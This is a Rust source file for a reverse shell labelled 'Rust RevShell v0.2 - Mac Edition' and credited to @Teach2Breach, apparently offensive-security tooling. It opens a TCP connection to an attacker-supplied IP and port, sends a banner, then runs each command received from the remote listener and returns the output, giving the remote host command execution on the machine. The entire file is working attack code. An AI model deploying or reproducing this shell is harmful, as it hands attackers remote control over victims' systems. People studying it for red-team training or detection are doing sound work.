use std::net::TcpStream;
use std::process::{Command, Stdio};
use std::io::{Read, Write};

fn main() {
    // Get the user-provided IP address and port
    //let ip = "127.0.0.1";
    //let port = "1234";

    //collect port and ip from command line
    let args: Vec<String> = std::env::args().collect();
        //if less than 3 arguments, print help and exit
        if args.len() < 3 {
            println!("Usage: {} <ip> <port>", args[0]);
            std::process::exit(1);
        }
    let ip = &args[1];
    let port = &args[2];

    // Create a TCP stream to the given address
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port)).expect("Failed to connect");

    //send the banner to the listener
    let banner = "Rust RevShell v0.2 - Mac Edition";
    stream.write(banner.as_bytes()).expect("Failed to write to stream");
    //send a newline to the listener by creating a variable for a newline
    let blank_line = " \n ";
    stream.write(blank_line.as_bytes()).expect("Failed to write to stream");
    //stream.write(b" \r \r".as_bytes()).expect("Failed to write to stream");
    //send "by @Teach2Breach" to the listener
    let by = "By: @Teach2Breach";
    stream.write(by.as_bytes()).expect("Failed to write to stream");
    //send the newline
    stream.write(blank_line.as_bytes()).expect("Failed to write to stream");
    //print "enter commands" to the listener
    let enter_commands = "Enter commands: ";
    stream.write(enter_commands.as_bytes()).expect("Failed to write to stream");
    //send the newline
    stream.write(blank_line.as_bytes()).expect("Failed to write to stream");

    // Wait for shell commands to be sent
    loop {
        let mut buf = [0; 1024];
        match stream.read(&mut buf) {
            Ok(n) => {
                // Execute the received command and redirect the output to the netcat listener

                //convert the buffer to a string for sending to Command
                let cmd = String::from_utf8_lossy(&buf[0..n]);
                //let cmd_string = cmd.to_string();
                //check to make sure the command is not empty
                if cmd.trim().is_empty() {
                    continue;
                }
                //println!("Command: {}", cmd);
                //if the command is exit, exit the program cleanly
                if cmd.trim() == "exit" {
                    std::process::exit(0);
                }

                //else execute the command
                else {
                    let mut output = Command::new(cmd.trim())
                        .stdout(Stdio::piped())
                        .spawn()
                        .expect("Failed to execute command")
                        .stdout
                        .expect("Failed to get command output");

                    let mut output_vec = Vec::new();
                    output.read_to_end(&mut output_vec).expect("Failed to read command output");
                    stream.write(&output_vec).expect("Failed to write to stream");
                }
            },
            Err(err) => println!("Error: {}", err),
        }
    }
}

